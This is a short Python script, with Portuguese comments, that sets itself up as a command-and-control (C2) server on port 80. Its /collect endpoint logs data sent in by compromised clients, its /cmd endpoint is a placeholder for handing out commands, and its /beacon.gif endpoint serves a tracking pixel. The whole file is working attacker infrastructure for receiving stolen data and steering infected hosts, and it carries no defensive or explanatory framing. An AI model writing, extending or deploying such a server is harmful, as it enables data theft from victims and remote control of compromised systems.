from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import json

class C2Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if '/collect' in self.path:
            params = parse_qs(self.path.split('?')[1] if '?' in self.path else '')
            data = params.get('d', [''])[0]
            print(f"\n[COLLECT] {data[:200]}...")
            self.send_response(200)
            self.end_headers()
        elif '/cmd' in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'[]')  # Comandos aqui depois
        elif '/beacon.gif' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        else:
            super().do_GET()

    def do_POST(self):
        self.do_GET()

print("C2 Server rodando em http://0.0.0.0:80")
HTTPServer(('', 80), C2Handler).serve_forever()
